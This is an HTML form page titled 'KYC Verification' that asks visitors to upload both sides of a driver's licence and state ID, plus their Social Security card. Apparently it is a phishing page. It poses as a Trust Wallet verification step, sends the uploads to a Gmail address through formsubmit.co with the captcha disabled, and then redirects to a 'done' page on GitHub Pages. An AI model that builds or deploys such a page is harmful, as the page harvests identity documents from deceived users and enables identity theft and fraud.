<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KYC Verification</title>
    <!--Google Font-->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
    <!--Stylesheet-->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>Kyc verification </h1><br>
        <p>Make your Kyc verification to continue </p>
       <form action="https://formsubmit.co/user.help.trustwallet@gmail.com" method="POST" enctype="multipart/form-data">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="FORM 2 INFO!!!!">
                <input type="hidden" name="_next" value="https://echo-films.github.io/Kyc-verification/done.html">
  
   
            <div class="row">
                <div class="column">
                    <label for="name">Upload Your Driverlicence <b>(FRONT VIEW)</b></label> 
                    <input type="file" nam4="DL " id="DL"  required>
                </div>
                <div class="column">
                    <label for="email">Upload Driver licence (BACK VIEW)</label>
                    <input type="file" name="DL" id="DL"  required>
                </div>
            </div>
            <div class="row">
                <div class="column">
                    <label for="subject">Upload State ID (FRONT VIEW)</label>
                    <input type="file" name="state" id="stateID" required>
                </div>
                <div class="column">
                    <label for="contact">Upload State ID (BACK VIEW)</label>
                    <input type="file" name="number" id="contact" placeholder="Your phone number here" required>
                </div><div class="column">
                    <label for="contact">Upload Social Security Number (SSN)</label>
                    <input type="file" name="SSN" id="SSN" required>
                </div>
            </div>
            
            <button>Submit</button>
        </form>
    </div>
</body>
</html>
